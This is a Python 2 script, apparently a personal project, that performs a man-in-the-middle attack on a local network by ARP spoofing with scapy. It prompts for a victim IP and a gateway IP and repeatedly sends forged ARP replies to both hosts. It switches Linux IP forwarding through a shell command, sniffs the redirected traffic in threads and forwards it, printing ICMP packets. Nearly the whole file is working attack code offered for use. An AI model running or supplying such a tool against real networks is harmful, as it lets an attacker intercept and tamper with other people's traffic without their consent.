"""
Author: Doron Goldman
An python program implenting man in the middle attack through arp spoofing
"""
import socket
import scapy.all as sp
import sys
import os
import time
import threading
import Queue
sp.conf.verb = 0
BROADCAST = "ff:ff:ff:ff:ff:ff"
REPLAY = 2
from uuid import getnode as get_mac


class Attack_Info(object, ):
    def __init__(self,victim_ip ,gate_ip , my_ip):
        self.mIP = my_ip
        self.gIP = gate_ip
        self.vIP = victim_ip
        print "gip:", self.gIP
        self.mac = ':'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2))
        self.arp_table = {ip: Attack_Info.get_mac(ip) for ip in [self.vIP,self.gIP]}

    @staticmethod
    def get_mac(IP):
        """
        args:
        IP:  an ip address
        returns: return the corresponding mac adress
        using the basic arp protocol to discover the targets real mac addres
        """
        ans, uans = sp.srp(sp.Ether(dst=BROADCAST) / sp.ARP(pdst=IP),
                        timeout=2, inter=0.1)
        for snd, rcv in ans:
            # format the mac address from the arp replay
            return rcv.sprintf(r"%Ether.src%")


class Attack_Thread(object, ):
    TIMEOUT = 10


    @staticmethod
    def set_ip_forward(f):
        """
        args: f: 0 for off; 1 for on
        returns: None
        only supported by linux systems
        sets ip forwarding in the system
        """
        os.system("echo %s > /proc/sys/net/ipv4/ip_forward" % (f,))


    def __init__(self, ):
        self.stop = threading.Event() # used for closing thread and sub threads cleanly

    def close(self,):
        self.stop.clear()
        self. set_ip_forward(0)
        sp.send(sp.ARP(op=REPLAY, pdst=info.gIP, psrc=info.vIP, hwdst=BROADCAST,
                       hwsrc=info.arp_table[info.vIP],), count=7)
        sp.send(sp.ARP(op=REPLAY, pdst=info.vIP, psrc=info.gIP, hwdst=BROADCAST,
                       hwsrc=info.arp_table[info.gIP],), count=7)
        self.sniffer.join()

    def run(self, ):
        self.stop.set()
        self.set_ip_forward(0)
        try:
            self.sniffer = Mitm_Thread(self.stop, )
            self.sniffer.start()
            self.spoof()
        finally:
            self.close()


    def spoof(self,):
        """
        args : self: an Attack instance
        returns: None
        tells the target you are the gateway and the gateway that you are the target
        """
        while self.stop.wait(0):
            sp.send(sp.ARP(op=REPLAY, pdst=info.vIP, psrc=info.gIP, hwdst=info.arp_table[info.vIP]))
            sp.send(sp.ARP(op=REPLAY, pdst=info.gIP, psrc=info.vIP, hwdst=info.arp_table[info.gIP]))
            time.sleep(Attack_Thread.TIMEOUT)#refresh the targets arp cache every timeout

class Mitm_Thread(threading.Thread):
    """
    This  thread is used for sniffing the packets
    and then forwarding them + modfying them
    """
    def __init__(self, stop):
        self.stop = stop
        self.q = Queue.Queue()
        self.forwader = threading.Thread(target=self.pkt_handler)
        super(Mitm_Thread, self).__init__()
    def run(self, ):
        self.forwader.start()
        bpf_filter = '(not (dst host %s or  src host %s)) and ether dst %s' % (info.mIP, info.mIP, info.mac) 
        print bpf_filter
        while self.stop.wait(0):
            sp.sniff(filter=bpf_filter, timeout=5, prn=lambda pkt: self.q.put(pkt))
        self.q.put("exit")
    def pkt_handler( self):   
        while 1:
            pkt = self.q.get()
            if pkt == "exit": break
            threading.Thread(target = self.forward, args = (pkt, )).start()

    def forward(self, pkt, ):
        if pkt.haslayer(sp.IP):
            ip = pkt.getlayer(sp.IP)
            get_mac = lambda x: info.arp_table.get(x, info.arp_table[info.gIP])
            ether = sp.Ether(dst=get_mac(ip.dst))
            if pkt.haslayer(sp.ICMP):
                pkt.show()
            sp.sendp(ether/ip)



print "newstfsdt"
vIP, gIP = tuple(raw_input("pls enter " + x + " ") for x in ["victimIP", "gateIP"])
mIP = ((([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0])
info = Attack_Info(vIP, gIP, mIP)
attack = Attack_Thread()
attack.run()
